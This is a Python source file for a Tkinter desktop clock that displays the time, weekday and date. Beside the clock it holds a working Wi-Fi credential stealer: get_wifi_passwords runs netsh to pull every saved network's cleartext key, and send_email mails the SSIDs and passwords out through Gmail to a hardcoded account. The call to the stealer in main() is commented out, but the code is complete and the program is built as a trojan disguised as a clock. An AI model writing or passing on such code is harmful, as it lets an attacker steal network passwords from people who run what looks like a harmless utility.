import subprocess, re, smtplib, os
from tkinter import *
from time import *
from PIL import ImageTk, Image

def get_wifi_passwords():
    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
    profile_names = re.findall("All User Profile     : (.*)\r", command_output)

    wifi_list = list()

    if len(profile_names) != 0:
        for name in profile_names:
            wifi_profile = dict()
            profile_info = subprocess.run(["netsh", "wlan", "show", "profiles", name], capture_output = True).stdout.decode()
            if re.search("Security key           : Absent", profile_info):
                continue
            else:
                wifi_profile["ssid"] = name
                profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
                password = re.search("Key Content            : (.*)\r", profile_info_pass)
                if password == None:
                    wifi_profile["password"] = None
                else:
                    wifi_profile["password"] = password[1]
                wifi_list.append(wifi_profile)

    send_email(wifi_list)

def send_email(wifi_list: list):
    sender = "balabezo@gmail.com"
    password = "password"
    subject = "Wifi name(s) and password(s)"
    body = ""

    if wifi_list == []:
        body = "No wifi connection found"
    else:
        for item in wifi_list:
            body += str(item) + "\n"

    message = f"Subject: {subject}\n\n{body}"

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()

    try:
        server.login(sender, password)
        print("Logged in...")
        server.sendmail(sender, sender, message)
        print("Email has been sent!")

    except smtplib.SMTPAuthenticationError:
        print("unable to sign in")

    server.quit()

def main():
    def update():
        time_string = strftime('%I:%M:%S %p')
        time_label.config(text= time_string)

        day_string = strftime('%A')
        day_label.config(text= day_string)

        date_string = strftime('%B %d, %Y')
        date_label.config(text= date_string)

        window.after(1000, update)

    # get_wifi_passwords()

    window = Tk()
    window.resizable(0,0)
    window.title('Clock')
    with Image.open('icon.ico') as image:
        icon = ImageTk.PhotoImage(image)
    window.iconphoto(True, icon)

    time_label = Label(window, font= ('Arial', 50), fg= '#00ff00', bg= 'black')
    time_label.pack()

    day_label = Label(window, font= ('Ink Free', 25))
    day_label.pack()

    date_label = Label(window, font= ('Ink Free', 30))
    date_label.pack()

    update()

    window.mainloop()

if __name__ == '__main__':
    main()